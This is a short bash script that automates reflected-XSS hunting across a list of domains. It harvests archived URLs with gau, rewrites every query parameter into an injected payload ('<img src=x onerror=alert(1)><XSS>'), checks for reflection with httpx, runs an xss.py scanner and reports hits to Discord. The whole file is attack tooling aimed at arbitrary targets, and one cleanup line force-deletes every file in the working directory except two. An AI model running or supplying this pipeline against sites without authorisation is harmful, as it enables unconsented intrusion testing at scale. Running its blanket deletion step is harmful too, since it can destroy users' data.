#!/bin/bash

# Read each domain from the domain.txt file
while IFS= read -r domain; do
    echo -e "\nURL grabbing started using gau for $domain \n"

    # Run the gau command and save the output to a file
    gau "$domain" --subs --threads 10 | grep "=" > "${domain}_gau_equalTo.txt"
    
    # Use sed to modify the URLs and save the result to a new file
    sed -e 's/=\([^&]*\)/=-->'\'';\\"\/><\/textarea><img src=x onerror=alert(1)><XSS>/g' "${domain}_gau_equalTo.txt" > "${domain}_updated_urls.txt"
    
    # Sort and remove duplicates
    sort "${domain}_updated_urls.txt" | uniq > "${domain}_unique_urls.txt"

    # HTTPX
    echo "Running HTTPX matchers to find potential XSS parameter for $domain"
    mkdir -p potentialXSS
    cat "${domain}_unique_urls.txt" | httpx -ms "<XSS>" -o "$PWD/potentialXSS/${domain}_pxss.txt"
    
    # logs entry
    wc "${domain}_gau_equalTo.txt" "${domain}_unique_urls.txt" "$PWD/potentialXSS/${domain}_pxss.txt" >> logs.txt

    # Remove temp files
    rm -rf "${domain}_gau_equalTo.txt" "${domain}_updated_urls.txt" "${domain}_unique_urls.txt"
    
    # Python XSS tool
    mkdir -p XSS
    python3 xss.py -l "$PWD/potentialXSS/${domain}_pxss.txt" -o "$PWD/XSS/${domain}_xss.txt" -t 20

    # Remove tmp files
    find . -maxdepth 1 -type f ! -name 'domain.txt' ! -name 'logs.txt' -exec rm -f {} +

    # Notify
    echo -e "RXSS Scanning finished for $domain\nRXSS found: $(cat $PWD/XSS/${domain}_xss.txt | wc -l)" | notify -provider discord -id rxss

done < $1
